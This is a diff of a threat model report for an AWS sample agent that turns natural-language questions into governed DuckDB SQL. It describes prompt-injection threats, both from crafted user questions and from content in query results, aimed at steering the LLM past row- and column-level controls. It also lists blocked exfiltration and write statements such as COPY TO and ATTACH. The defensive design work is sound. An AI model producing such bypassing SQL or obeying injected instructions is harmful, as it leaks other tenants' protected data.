@@ -1,12 +1,8 @@
 # Comprehensive Threat Model Report
 
-**Generated**: 2026-09-02 22:31:13
+**Generated**: 2026-09-04 23:59:59
 **Current Phase**: 9 - Output Generation and Documentation
-
-**Code validation re-run**: 2026-09-03 (round 2 - see "Code Validation Round 2" below; two authorization bypasses and one identity-source escalation were found in code that this model had marked resolved)
 **Overall Completion**: 100.0%
-
-> **Scope note.** This model was produced against the sample's governance, identity and engine boundaries. The context layer added afterwards (data map, cost gate, result shaping, history compression) and the second (cloud-ops) scenario run inside the same trust boundaries - LLM-generated SQL entering the agent process, the agent reaching the account's data plane - and are covered by the same controls (read-only gate, governance rewrite, universal hardening, least-privilege execution role), with the cost gate as an additional pre-engine check. They are not yet modelled as separate components or threat statements.
 
 ## Table of Contents
 
@@ -24,20 +20,20 @@
 
 ## Executive Summary
 
-Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->cost->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).
+Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level authorization layer implemented as an engine-neutral sqlglot rewrite in front of the embedded engine, TOTAL AT THE TABLE LEVEL by construction (a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement). Two plug-in scenarios: on-chain fund-flow investigation and enterprise cloud-ops (the account's own CUR 2.0 / CloudTrail / CloudWatch Logs exports). Inbound authentication via Amazon Cognito wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role); a streaming SSE entrypoint that binds the session to its principal and emits the per-statement gate->govern->cost->execute trace; and a Streamlit chat UI. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset, a real public OFAC sanctioned-address list, a small SYNTHETIC exchange deposit-label table, and the deployer's own cloud telemetry.
 
 ### Key Statistics
 
-- **Total Threats**: 18
-- **Total Mitigations**: 22
+- **Total Threats**: 27
+- **Total Mitigations**: 24
 - **Total Assumptions**: 5
 - **System Components**: 9
 - **Assets**: 5
-- **Threat Actors**: 12
+- **Threat Actors**: 14
 
 ## Business Context
 
-**Description**: Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->cost->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).
+**Description**: Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level authorization layer implemented as an engine-neutral sqlglot rewrite in front of the embedded engine, TOTAL AT THE TABLE LEVEL by construction (a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement). Two plug-in scenarios: on-chain fund-flow investigation and enterprise cloud-ops (the account's own CUR 2.0 / CloudTrail / CloudWatch Logs exports). Inbound authentication via Amazon Cognito wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role); a streaming SSE entrypoint that binds the session to its principal and emits the per-statement gate->govern->cost->execute trace; and a Streamlit chat UI. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset, a real public OFAC sanctioned-address list, a small SYNTHETIC exchange deposit-label table, and the deployer's own cloud telemetry.
 
 ### Business Features
 
@@ -68,32 +64,32 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **User Domain**: Financial
 - **Licensing / Ownership**: Open source
 - **Modern Paradigms**: Agentic AI, Cloud-native
-- **Description**: Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Core modules: (1) agent.py (composition root) and the data_agent/ package - one sub-package per layer (scheduling, context, governance, compute, storage) and a statement pipeline gate -> govern -> cost -> execute; Strands Agent + Bedrock Claude with one gated async-generator run_sql tool over an in-memory DuckDB (httpfs/iceberg/ducklake extensions). The read-only gate enforces EXACTLY ONE statement per call (duckdb.extract_statements, the engine's own parser) and strips leading SQL comments before keyword classification; identity resolution chain: verified JWT claims (custom:tenant/custom:role normalized) -> runtime user-id header -> payload identity -> default role. The streaming entrypoint (async generator -> SSE) emits typed envelopes incl. a per-statement gate/govern/cost/execute trace. (2) data_agent/governance/ - authorization: principal->role->policy mapping where an unknown role inside a known tenant falls back to that tenant's MOST RESTRICTED policy (content-derived restrictiveness ranking, declaration-order independent); sqlglot AST rewrite injecting RLS predicates via guarded subqueries and schema-aware CLS EXCLUDE; explicit selection of a denied column is rejected with a legible policy error naming column and role; raw table functions are governed by an ALLOWLIST on AST shape (only exp.Identifier FROM/JOIN sources allowed; pure generators excepted) rather than a function-name denylist; fail-closed on unparseable SQL. (3) ui/app.py - Streamlit chat client: Cognito USER_PASSWORD_AUTH login (client secret via env), sends the ID token as bearer to the runtime over raw HTTPS, renders the interleaved reasoning+tool transcript and a Trace tab. (4) infra/ CDK - S3 buckets (SSE, BlockPublicAccess, enforce_ssl), Cognito user pool + app client, least-privilege execution role, CloudWatch logs. CI gates: ruff / bandit / semgrep / detect-secrets / pytest (282 offline unit tests incl. mutation-verified fail-closed authz tests).
+- **Description**: Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Five layers in request order: Scheduling (data_agent/scheduling: claims->role, session binding, SSE), Context (data_agent/context: L0/L1 role-filtered data map, partition-filter cost gate, result shaping, history compression), Governance (data_agent/governance: policies + hardening + sqlglot rewrite, AUTHORIZATION ONLY, fail-closed, table-level deny-by-default), Compute (in-process DuckDB), Storage (S3 durable data). One statement pipeline (Gate->Govern->Cost->Execute) audits once per statement and fails closed on any exception. CI gates: ruff, 303 offline unit tests incl. adversarial authz regressions, bandit, semgrep, detect-secrets.
 
 ### Data Asset Profiles
 
 | ID | Name | Asset | Category | Content Types | Sensitivity | Compliance | States | Volume | Lifecycle | Business Domain | Description |
 |---|---|---|---|---|---|---|---|---|---|---|---|
-| DP001 | Analytical dataset on S3 | N/A | Structured Data | Non-sensitive / other | Public | N/A | At rest, In transit | Big data | Active | N/A | Parquet/Iceberg tables on S3: public aws-public-blockchain Ethereum data (eth_traces incident-window slice in S3 Tables/Glue/DuckLake legs, full history via raw views). Customer-substituted data may be confidential. Per-tenant visibility is enforced by the RLS/CLS rewrite - the asset the governance layer protects. |
-| DP002 | Identity claims (tenant, role) | N/A | API Data | Authentication credentials | Internal | N/A | In transit, In use | N/A | N/A | N/A | Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed inbound JWT authorizer (allowedAudience) BEFORE agent code runs, then normalized by _resolve_claims; or identity asserted by a SigV4-authenticated calling application (runtime user-id header / payload identity - local/CLI path). Integrity of these claims is the security foundation of the authorization layer. |
-| DP003 | Governance policy table | N/A | Configuration Data | System metadata | Internal | N/A | At rest, In use | N/A | N/A | N/A | GOVERNANCE_POLICIES JSON env configuration: per-table row_filter / deny_columns + allow_raw_paths switch, keyed by tenant:role. Defines who sees what; owned by the operator. Unknown roles in a known tenant resolve to the tenant's most restricted policy (content-derived ranking). |
-| DP004 | Attribution label tables | N/A | Structured Data | PII, Non-sensitive / other | Internal | N/A | At rest, In transit | Small | N/A | N/A | ofac_addresses (REAL public OFAC SDN list, ~120 rows) and cex_deposit_labels (SYNTHETIC exchange deposit labels whose subject_identity column mimics customer KYC linkage to demonstrate CLS). subject_identity is column-denied to the junior role; in a real deployment this table carries actual KYC linkage and its protection is the point of the CLS demo. |
-| DP005 | Cognito app client secret | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | App client secret used by the Streamlit UI for SECRET_HASH computation during USER_PASSWORD_AUTH login. Supplied via environment variable to the UI process; never committed to the repo. |
-| DP006 | DuckLake PostgreSQL credentials | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | Optional multi-writer catalog credentials stored in AWS Secrets Manager, fetched at runtime by the execution role; never in env vars or code. |
+| DP001 | Analytical dataset on S3 (4 access paths) | N/A | Structured Data | Non-sensitive / other | Public | N/A | At rest, In transit | Big data | Active | N/A | Parquet/Iceberg tables on S3 reachable via raw glob, S3 Tables, Glue, DuckLake. Public aws-public-blockchain Ethereum data + the deployer's own CUR/CloudTrail/CloudWatch exports. Per-tenant/per-account visibility is enforced by the RLS/CLS rewrite; a table not named in a restricted principal's policy is refused outright (table-level deny-by-default). |
+| DP002 | Identity claims (tenant, role, sub) | N/A | API Data | Authentication credentials | Internal | N/A | In transit, In use | N/A | N/A | N/A | Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed JWT authorizer BEFORE agent code runs; sub binds the session owner. Or identity asserted by a SigV4 caller (local/CLI path). Integrity of these claims is the authorization foundation. |
+| DP003 | Governance policy table | N/A | Configuration Data | System metadata | Internal | N/A | At rest, In use | N/A | N/A | N/A | GOVERNANCE_POLICIES JSON: per tenant:role, the tables that role may read (row_filter / deny_columns, {} = readable/no restriction) + allow_raw_paths. Validated at import. Unknown roles resolve to the tenant's most-restricted policy; no policy = deny-all floor. |
+| DP004 | Attribution label tables (OFAC + synthetic CEX) | N/A | Structured Data | PII, Non-sensitive / other | Internal | N/A | At rest, In transit | Small | N/A | N/A | ofac_addresses (REAL public OFAC SDN list) and cex_deposit_labels (SYNTHETIC; subject_identity mimics KYC linkage, column-denied to junior and hidden from search_schema discovery for that role). |
+| DP005 | Cognito app client secret | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | App client secret for SECRET_HASH during USER_PASSWORD_AUTH; supplied to the UI via env, never committed. |
+| DP006 | DuckLake PostgreSQL credentials | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | Optional multi-writer catalog credentials in AWS Secrets Manager, fetched at runtime by the execution role; never in env or code. (PG catalog leg not deployed in the reference config.) |
 
 ### User Personas
 
 | ID | Persona | Name | Privilege | Affiliation | Roles | Intent | Entity Type | Authentication | Threat Actor Overlay | In Scope | Description |
 |---|---|---|---|---|---|---|---|---|---|---|---|
-| UP001 | Authenticated Standard User | End user (investigator / junior analyst) | Low | Customer | End User | Legitimate | Human | Token | N/A | Yes | Logs in at Cognito; ID-token claims carry tenant/role; may be a restricted principal whose data visibility is limited by RLS/CLS policy. Primary adversary in this model: tries to observe other tenants' rows or denied columns through crafted natural-language questions (prompt injection into generated SQL). |
-| UP002 | Non-Human Identity / Service Account | Calling application (SigV4) | Elevated | Customer | Integration Endpoint | Legitimate | Non-Human | IAM Role | N/A | Yes | IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its end-users' identity via the runtime user-id header or payload identity object. Its compromise means arbitrary identity assertion - documented trust assumption; unused when the JWT authorizer is configured (the deployed default). |
-| UP003 | Developer / DevOps User | Operator (deployer) | Administrative | Customer | Administrator, Developer | Legitimate | Human | IAM Role | N/A | Yes | Customer engineer deploying the sample; owns all env configuration including GOVERNANCE_POLICIES, Cognito pool/users, and catalog ARNs. Out of scope as an adversary (owns the account and the data). |
-| UP004 | Non-Human Identity / Service Account | LLM (Bedrock Claude) | Low | N/A | Service Account | Compromised | Non-Human | None | N/A | Yes | Generates SQL from natural language. Untrusted-input channel: its output executes against the engine after the single-statement read-only gate and governance rewrite. Subject to prompt injection via user questions; treated as an attacker-controlled SQL source in this model. |
+| UP001 | Authenticated Standard User | End user (investigator / junior analyst) | Low | Customer | End User | Legitimate | Human | Token | N/A | Yes | Logs in at Cognito; ID-token claims carry tenant/role; a restricted principal whose visibility is bounded by RLS/CLS and by table-level deny-by-default. Primary adversary: crafts natural-language questions to steer the LLM into SQL that reaches other tenants' rows, denied columns, or unlisted tables. |
+| UP002 | Non-Human Identity / Service Account | Calling application (SigV4) | Elevated | Customer | Integration Endpoint | Legitimate | Non-Human | IAM Role | N/A | Yes | IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its users' identity via header/payload. Unused when the JWT authorizer is configured (the deployed default). Must also use a fresh, unguessable session id per identity (session-binding assumption). |
+| UP003 | Developer / DevOps User | Operator (deployer) | Administrative | Customer | Administrator, Developer | Legitimate | Human | IAM Role | N/A | Yes | Customer engineer deploying the sample; owns env config incl. GOVERNANCE_POLICIES, Cognito users, catalog ARNs. Out of scope as an adversary; misconfiguration is in scope. |
+| UP004 | Non-Human Identity / Service Account | LLM (Bedrock Claude) | Low | Vendor | Service Account | Compromised | Non-Human | None | N/A | Yes | Generates SQL from natural language; its output executes after the single-statement read-only gate and governance rewrite. Untrusted-input channel: subject to prompt injection via user questions and via data-borne content in query results. |
 
 ### Non-Functional Requirements
 
-- **Fail-Safe Behaviour**: Revert to safe state — The governance layer must fail closed: a restricted principal must never observe rows or columns outside their policy via any of the four access paths. Unparseable SQL, schema-probe failure, unknown principal (falls to the tenant's MOST restricted policy or the default role), and explicit denied-column selection must result in rejection or the most restrictive policy - never fail-open. Verified by mutation testing (code-validation fixes). Re-validated 2026-09-03 (round 2): completeness is part of the requirement - unmodellable statement shapes are rejected, local names may not shadow governed tables, and a principal with no policy gets the deny-all floor rather than an unrestricted default.
-- **User Error Protection**: Strong — Agent-generated SQL (which may be wrong or adversarial via prompt injection) must not write persistently, exfiltrate to external targets (COPY TO), attach foreign databases, smuggle a second statement behind a read (single-statement rule enforced with the engine's own parser), or reach raw file-reading table functions as a restricted principal (AST-shape allowlist, not a name denylist).
+- **Fail-Safe Behaviour**: Revert to safe state — The governance layer fails closed: a restricted principal never observes rows, columns, or TABLES outside its policy via any of the four access paths. Unparseable SQL, opaque statement shapes, unknown principals (deny-all floor), explicit denied-column selection, a mounted-but-unlisted table, and any exception in the rewrite path result in rejection. Verified by 303 offline tests + a 19-check re-validation on the real code paths (the table-level deny-by-default release).
+- **User Error Protection**: Strong — Agent-generated SQL (possibly adversarial via prompt injection) must not write persistently, exfiltrate (COPY TO), attach foreign databases, smuggle a second statement, reach raw file functions as a restricted principal, overwrite a framework result table (reserved-name check on the parsed tree), or degrade the cost gate to a whole-prefix scan (wide/unsatisfiable literal ranges are refused).
 
 ## System Architecture
 
@@ -101,44 +97,45 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 
 | ID | Name | Type | Service Provider | Description |
 |---|---|---|---|---|
-| C001 | Streamlit chat UI | Compute | Other | Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over raw HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory. |
-| C002 | Amazon Cognito user pool | Security | AWS | Identity provider: user pool with custom:tenant/custom:role attributes; app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id; the runtime authorizer validates allowedAudience against it. |
-| C003 | AgentCore Runtime + inbound JWT authorizer (managed) | Compute | AWS | One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. AWS-managed, out of sample scope. |
-| C004 | Identity resolution (_resolve_claims) | Security | N/A | data_agent/scheduling/runtime.py: extracts claims in trust order: verified JWT claims (custom:tenant/custom:role normalized to tenant/role) -> X-Amzn-Bedrock-AgentCore-Runtime-User-Id header (SigV4 caller asserts) -> payload identity object -> default role. jwt.decode(verify_signature=False) is claims EXTRACTION from a token already verified by the managed authorizer. |
-| C005 | Strands Agent + Bedrock Claude | Compute | AWS | LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline. The streaming entrypoint maps Strands events to typed SSE envelopes including the per-statement gate/govern/cost/execute trace. |
-| C006 | run_sql gate (single-statement + read-only) | Security | N/A | data_agent/tools.py + data_agent/compute/gate.py: async-generator tool. Gate strips leading SQL comments for keyword classification, requires EXACTLY ONE statement (duckdb.extract_statements — the engine's own parser, no lexer divergence), and allowlists read statements + CREATE TEMP TABLE/VIEW; rejects persistent writes, ATTACH, COPY TO, and multi-statement smuggling. First control in the SQL pipeline; emits gate trace events. |
-| C007 | Governance rewrite (data_agent/governance/) | Security | N/A | AuthZ layer: principal->role->policy (unknown role in a known tenant falls back to that tenant's MOST restricted policy, content-derived ranking); sqlglot AST rewrite — RLS predicates via guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), fail-closed on parse failure. Runs after the gate, before the engine; emits govern trace events (rls[]/cls[]/rejection). |
-| C008 | DuckDB engine (in-process) | Analytics | N/A | In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under _conn_lock serialization. |
-| C009 | CloudWatch Logs | Other | AWS | Runtime logs incl. per-query engine metrics and governed flag. |
+| C001 | Streamlit chat UI | Compute | Other | Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory. |
+| C002 | Amazon Cognito user pool | Security | AWS | Identity provider: user pool with custom:tenant/custom:role attributes (READ-only on the app client, so a user cannot self-assign them); app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id. |
+| C003 | AgentCore Runtime + inbound JWT authorizer (managed) | Compute | AWS | One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. Session isolation is per runtimeSessionId (caller-provided). |
+| C004 | Scheduling / identity + session binding | Security | Other | Extracts claims in trust order (verified JWT claims -> User-Id header -> payload identity -> deny-all default), resolves role, and BINDS the session to its owner (JWT sub, else tenant:role): on an owner change it resets the engine, result store, data map, L0 injection, audit counters and conversation history before running (T003 fix). Emits typed SSE envelopes. |
+| C005 | Strands Agent + Bedrock Claude | Compute | AWS | LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline; the prompt states that row content is data, not instructions. |
+| C006 | Statement pipeline: Gate -> Govern -> Cost -> Execute | Security | Other | One ordered path for every statement. Gate: single-statement + read-only allowlist + reserved-name check (on the parsed tree). Govern: authorization rewrite (fails closed on ANY exception). Cost: partition-filter gate + path expansion. Execute: under the connection lock. The driver audits exactly once per statement, even on an unexpected exception. |
+| C007 | Governance rewrite (authorization) | Security | Other | AuthZ layer: principal->role->policy (unknown role -> tenant's most-restricted; no policy -> deny-all). sqlglot AST rewrite: RLS predicates, schema-aware CLS EXCLUDE, denied-column rejection, raw-path AST-shape allowlist, no local name may shadow a governed table, statement-root allowlist, and TABLE-LEVEL DENY-BY-DEFAULT (a restricted principal may reference only tables its policy names, session temp objects, or local names). Fail-closed. |
+| C008 | DuckDB engine (in-process) | Analytics | Other | In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under conn_lock serialization. Exposes session_objects() so governance can permit a principal's own temp tables. |
+| C009 | CloudWatch Logs | Other | AWS | Runtime logs incl. one EMF audit line per statement (principal, SQL, governance/cost decision, outcome). An optional export of this log group can be mounted as the cw_logs table — readable only by the unrestricted operator role. |
 
 ### Connections
 
 | ID | Source | Destination | Protocol | Port | Encrypted | Description |
 |---|---|---|---|---|---|---|
 | CN001 | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | 443 | Yes | UI logs the user in (USER_PASSWORD_AUTH + SECRET_HASH); Cognito returns ID/access/refresh tokens. UI keeps the ID token for the bearer header. |
-| CN002 | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | UI POSTs {prompt} to the runtime /invocations endpoint with Authorization: Bearer <ID token> and a session id header; consumes the SSE envelope stream (text/reasoning/tool_start/trace/result) back. The managed authorizer validates the token before agent code runs. |
-| CN003 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | Identity resolution (_resolve_claims) (C004) | HTTPS | N/A | Yes | Runtime invokes the agent entrypoint with allowlisted headers (Authorization JWT already validated by the managed authorizer) + payload. Claims extraction happens in _resolve_claims. |
-| CN004 | Identity resolution (_resolve_claims) (C004) | Governance rewrite (data_agent/governance/) (C007) | Other | N/A | Yes | Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted). |
-| CN005 | Strands Agent + Bedrock Claude (C005) | run_sql gate (single-statement + read-only) (C006) | Other | N/A | Yes | LLM emits SQL via the run_sql tool call; enters the single-statement read-only gate. UNTRUSTED input crossing. |
-| CN006 | run_sql gate (single-statement + read-only) (C006) | Governance rewrite (data_agent/governance/) (C007) | Other | N/A | Yes | Gate-passed single statement enters the governance rewrite (RLS/CLS injection, denied-column rejection, raw-path allowlist, fail-closed parse). |
-| CN007 | Governance rewrite (data_agent/governance/) (C007) | DuckDB engine (in-process) (C008) | Other | N/A | Yes | Governed SQL executes on the in-process engine under _conn_lock serialization. |
-| CN008 | DuckDB engine (in-process) (C008) | S3 analytical data (4 access paths) (D001) | HTTPS | 443 | Yes | Engine reads S3/Iceberg/DuckLake data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS). |
-| CN009 | DuckDB engine (in-process) (C008) | Label tables on S3 (OFAC + synthetic CEX) (D002) | HTTPS | 443 | Yes | Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role. |
-| CN010 | DuckDB engine (in-process) (C008) | Secrets Manager (DuckLake PG credentials) (D003) | HTTPS | 443 | Yes | Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time. |
-| CN011 | Strands Agent + Bedrock Claude (C005) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel. |
-| CN012 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | CloudWatch Logs (C009) | HTTPS | 443 | Yes | Runtime/agent logs to CloudWatch incl. engine metrics and governed flag. |
+| CN002 | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | UI POSTs {prompt} to /invocations with Authorization: Bearer <ID token> and a session id; consumes the SSE envelope stream. The managed authorizer validates the token before agent code runs. |
+| CN003 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | Scheduling / identity + session binding (C004) | HTTPS | N/A | Yes | Runtime invokes the agent entrypoint with allowlisted headers (JWT already validated) + payload. Scheduling extracts claims and binds the session owner. |
+| CN004 | Scheduling / identity + session binding (C004) | Governance rewrite (authorization) (C007) | Other | N/A | Yes | Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted; none -> deny-all). |
+| CN005 | Scheduling / identity + session binding (C004) | Strands Agent + Bedrock Claude (C005) | Other | N/A | Yes | Scheduling invokes the agent model loop (agent.stream_async) after binding the session and injecting the role-filtered L0 map. |
+| CN006 | Strands Agent + Bedrock Claude (C005) | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | Other | N/A | Yes | LLM emits SQL via the run_sql tool call; enters the statement pipeline. UNTRUSTED input crossing (prompt-injectable, and influenced by data-borne content). |
+| CN007 | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | Governance rewrite (authorization) (C007) | Other | N/A | Yes | The Govern stage calls the authorization rewrite (RLS/CLS, raw-path allowlist, table-level deny-by-default, fail-closed on any exception). |
+| CN008 | Governance rewrite (authorization) (C007) | DuckDB engine (in-process) (C008) | Other | N/A | Yes | Governed, cost-gated SQL executes on the in-process engine under conn_lock serialization. |
+| CN009 | DuckDB engine (in-process) (C008) | S3 analytical data (4 access paths) (D001) | HTTPS | 443 | Yes | Engine reads S3/Iceberg/DuckLake/export data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS). |
+| CN010 | DuckDB engine (in-process) (C008) | Label tables on S3 (OFAC + synthetic CEX) (D002) | HTTPS | 443 | Yes | Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role. |
+| CN011 | DuckDB engine (in-process) (C008) | Secrets Manager (DuckLake PG credentials) (D003) | HTTPS | 443 | Yes | Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time. |
+| CN012 | Strands Agent + Bedrock Claude (C005) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel. |
+| CN013 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | CloudWatch Logs (C009) | HTTPS | 443 | Yes | Runtime/agent logs to CloudWatch incl. one EMF audit line per statement (principal, SQL, governance/cost decision, outcome). |
 
 ### Data Stores
 
 | ID | Name | Type | Classification | Encrypted at Rest | Description |
 |---|---|---|---|---|---|
-| D001 | S3 analytical data (4 access paths) | Object Storage | Public | Yes | Amazon S3 / S3 Tables / Glue Data Catalog / DuckLake: same logical tables reachable via raw Parquet glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, and DuckLake catalog. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Sample data public; customer-substituted data may be confidential. |
-| D002 | Label tables on S3 (OFAC + synthetic CEX) | Object Storage | Internal | Yes | ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity mimics KYC linkage and is the CLS-protected column) under LABELS_PREFIX on the hardened bucket. |
+| D001 | S3 analytical data (4 access paths) | Object Storage | Public | Yes | Amazon S3 / S3 Tables / Glue / DuckLake: same logical tables via raw glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake. Plus the deployer's own CUR/CloudTrail/CloudWatch exports. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Source-bucket IAM grant scoped to the CUR prefix and account-pinned CloudTrail prefix (T008 fix). |
+| D002 | Label tables on S3 (OFAC + synthetic CEX) | Object Storage | Internal | Yes | ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity is the CLS-protected column) under a validated LABELS_PREFIX on the hardened bucket. |
 | D003 | Secrets Manager (DuckLake PG credentials) | Other | Restricted | Yes | AWS Secrets Manager: optional PostgreSQL catalog credentials for the multi-writer DuckLake form; fetched at runtime by the execution role; never in env or code. |
 
 ## Threat Actors
 
-### Insider
+### Authenticated restricted analyst (insider)
 
 - **Type**: Insider Threat
 - **Motivations**: Financial gain, Revenge / grievance
@@ -149,7 +146,7 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **Targeting Specificity**: Targeted
 - **Relevant**: Yes
 - **Priority**: 1/10
-- **Description**: The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that bypasses the RLS/CLS rewrite — cross-tenant rows, denied columns, raw file reads, or multi-statement smuggling.
+- **Description**: The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that reaches other tenants' rows, denied columns, unlisted tables, or raw file reads. The full authorization surface is aimed at this actor.
 
 ### External Attacker
 
@@ -223,7 +220,7 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **Targeting Specificity**: Opportunistic
 - **Relevant**: Yes
 - **Priority**: 5/10
-- **Description**: Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the sample's CDK — rotating them is the deployer's job).
+- **Description**: Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the CDK — rotating them is the deployer's job).
 
 ### Disgruntled Employee
 
@@ -237,7 +234,7 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **Relevant**: No
 - **Description**: A current or former employee with a grievance
 
-### Privileged User
+### Operator (misconfiguration)
 
 - **Type**: Privileged User
 - **Motivations**: Financial gain
@@ -248,9 +245,9 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
